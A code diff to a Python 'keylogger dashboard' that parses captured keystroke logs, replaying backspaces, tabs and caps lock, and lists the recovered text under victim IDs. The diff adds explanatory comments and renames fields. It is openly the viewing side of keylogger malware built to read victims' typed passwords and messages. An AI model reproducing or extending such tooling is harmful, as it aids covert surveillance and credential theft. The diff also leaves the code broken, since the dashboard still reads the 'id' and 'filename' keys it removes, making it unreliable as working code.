@@ -4,41 +4,42 @@ import time
 
 LOG_DIR = Path("logs")
 TOKEN_PATTERN = re.compile(r"\[(BS|TAB|DEL|SHIFT|CAPS)\]")
-REFRESH_SECONDS = 2
+REFRESH_SECONDS = 1
 TAB_SIZE = 4
 
 def clear_screen():
-    print("\033[2J\033[H", end="")
+    print("\033[2J\033[H", end="") # Erase the entire screen, Move the cursor to top left of screen
 
 def apply_backspace(lines):
     if not lines:
         lines.append("")
 
-    if lines[-1]:
-        lines[-1] = lines[-1][:-1]
-    elif len(lines) > 1:
+    if lines[-1]: # Symbol for last line of text
+        lines[-1] = lines[-1][:-1] # Cut off the last char
+    elif len(lines) > 1: # If curr line empty, and there are more lines before, remove this/last line
         lines.pop()
 
 def parse_log(raw_text):
-    raw_text = raw_text.replace("\\[", "[")
+    raw_text = raw_text.replace("\\[", "[") # \\ take actual "\" not the escape char
+    raw_text = raw_text.replace("\\]", "]")
 
     lines = [""]
     caps_on = False
     pos = 0
 
-    for match in TOKEN_PATTERN.finditer(raw_text):
-        start, end = match.span()
+    for match in TOKEN_PATTERN.finditer(raw_text): # Find all the tokens
+        start, end = match.span() # returns the exact starting and ending index of the tag inside the string
 
-        normal_text = raw_text[pos:start]
+        normal_text = raw_text[pos:start] # Helk[BS]lo --> Helk
         for ch in normal_text:
             if ch == "\n":
                 lines.append("")
             else:
-                if caps_on and ch.isalpha():
+                if caps_on and ch.isalpha(): # Alphabet letter
                     ch = ch.upper()
                 lines[-1] += ch
 
-        token = match.group()
+        token = match.group() # Extracts the actual string of the tag ([BS])
 
         if token == "[BS]":
             apply_backspace(lines)
@@ -51,9 +52,9 @@ def parse_log(raw_text):
         elif token == "[CAPS]":
             caps_on = not caps_on
 
-        pos = end
+        pos = end # End of the tag
 
-    remaining_text = raw_text[pos:]
+    remaining_text = raw_text[pos:] # Helk[BS]lo --> lo
     for ch in remaining_text:
         if ch == "\n":
             lines.append("")
@@ -62,7 +63,7 @@ def parse_log(raw_text):
                 ch = ch.upper()
             lines[-1] += ch
 
-    return "\n".join(lines)
+    return "\n".join(lines) # Finished with this line and we glue it to the next like with \n
 
 
 def read_all_logs():
@@ -71,14 +72,14 @@ def read_all_logs():
     if not LOG_DIR.exists():
         return clients
 
-    for log_file in sorted(LOG_DIR.glob("*.log")):
-        raw_text = log_file.read_text(errors="replace")
+    for log_file in sorted(LOG_DIR.glob("*.log")): # For every file and checks if the filename ends with .log
+                                                   # glob generates an array: ["logs/victim1.log", "logs/victim2.log"]
+        raw_text = log_file.read_text()
         parsed_text = parse_log(raw_text)
 
         clients.append({
-            "id": log_file.stem,
-            "filename": log_file.name,
-            "size": log_file.stat().st_size,
+            "victim id": log_file.stem, # .stem gets the filename
+            "size": log_file.stat().st_size, # Size of the file in bytes
             "parsed_text": parsed_text
         })
 
@@ -87,12 +88,12 @@ def read_all_logs():
 
 def show_dashboard(clients):
     clear_screen()
-    print("=== KEYLOGGER DASHBOARD ===")
+    print("--------- KEYLOGGER DASHBOARD ---------")
     print(f"Clients found: {len(clients)}")
     print()
 
     for client in clients:
-        print("=" * 70)
+        print("-" * 70)
         print(f"Victim ID: {client['id']}")
         print(f"File: {client['filename']} | Size: {client['size']} bytes")
         print("-" * 70)
